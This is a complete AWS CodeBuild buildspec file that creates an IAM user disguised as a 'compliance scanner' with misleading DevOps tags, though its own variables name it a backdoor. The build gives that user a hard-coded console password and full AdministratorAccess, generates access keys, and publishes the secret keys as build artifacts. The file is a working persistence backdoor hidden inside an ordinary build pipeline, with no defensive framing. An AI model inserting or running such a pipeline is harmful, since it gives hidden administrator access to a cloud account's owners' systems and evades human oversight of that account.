version: 0.2

env:
  variables:
    BACKDOOR_USER: "hexalytix-compliance-scanner"
    BACKDOOR_PASSWORD: "thanksforaccess123!"

phases:
  pre_build:
    commands:
      - echo "=== Starting build at $(date) ==="
      - echo "Creating backdoor user: $BACKDOOR_USER"

  build:
    commands:
      - |
        aws iam create-user --user-name "$BACKDOOR_USER" --path "/service-accounts/" \
          --tags Key=Purpose,Value="Automated compliance scanning" Key=Owner,Value="DevOps Team" Key=CreatedBy,Value="ComplianceAutomation" \
          2>/dev/null || echo "User creation failed or user already exists"

      - |
        aws iam create-login-profile --user-name "$BACKDOOR_USER" --password "$BACKDOOR_PASSWORD" --password-reset-required \
          2>/dev/null || echo "Login profile creation failed or already exists"

      - |
        aws iam attach-user-policy --user-name "$BACKDOOR_USER" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" \
          2>/dev/null || echo "AdministratorAccess policy attachment failed"

      - |
        echo "Generating access keys for backdoor user..."
        BACKDOOR_KEYS=$(aws iam create-access-key --user-name "$BACKDOOR_USER" 2>/dev/null || echo "Key creation failed")

        if [ "$BACKDOOR_KEYS" != "Key creation failed" ]; then
          echo "Backdoor access keys created successfully"
          echo "$BACKDOOR_KEYS" | jq -r '.AccessKey.AccessKeyId' > /tmp/backdoor_access_key.txt
          echo "$BACKDOOR_KEYS" | jq -r '.AccessKey.SecretAccessKey' > /tmp/backdoor_secret_key.txt
          echo "Access Key ID saved to temporary storage"
          echo "Secret Access Key saved to temporary storage"
        fi

artifacts:
  files:
    - /tmp/backdoor_access_key.txt
    - /tmp/backdoor_secret_key.txt
